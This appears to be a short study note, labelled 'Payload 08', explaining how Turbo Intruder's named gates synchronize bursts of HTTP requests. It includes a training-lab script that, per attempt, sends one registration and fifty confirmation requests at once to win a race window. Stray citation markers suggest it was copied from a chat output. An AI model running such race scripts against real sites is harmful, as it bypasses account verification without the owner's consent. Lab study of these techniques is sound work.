# Payload 08 – Gate-Based Race

## Concept

Turbo Intruder allows requests to be grouped using named gates.

Example:

```python
engine.queue(target.req, gate='1')
```

Multiple requests can share the same gate.

---

## Example

```python
for i in range(20):
    engine.queue(target.req, gate='1')

engine.openGate('1')
```

All queued requests assigned to:

```text
gate='1'
```

are released when:

```python
engine.openGate('1')
```

is executed.

The source describes this as the mechanism used to synchronize groups of requests. :contentReference[oaicite:13]{index=13}

---

## Multiple Gates

The partial-construction lab uses a gate per registration attempt:

```python
for attempt in range(20):

    currentAttempt = str(attempt)

    engine.queue(
        target.req,
        username,
        gate=currentAttempt
    )

    for i in range(50):
        engine.queue(
            confirmationReq,
            gate=currentAttempt
        )

    engine.openGate(currentAttempt)
```

Conceptually:

```text
Gate 0
 ├── Registration
 └── Confirmation ×50

Gate 1
 ├── Registration
 └── Confirmation ×50

Gate 2
 ├── Registration
 └── Confirmation ×50
```

This provides multiple attempts at hitting the race window. :contentReference[oaicite:14]{index=14}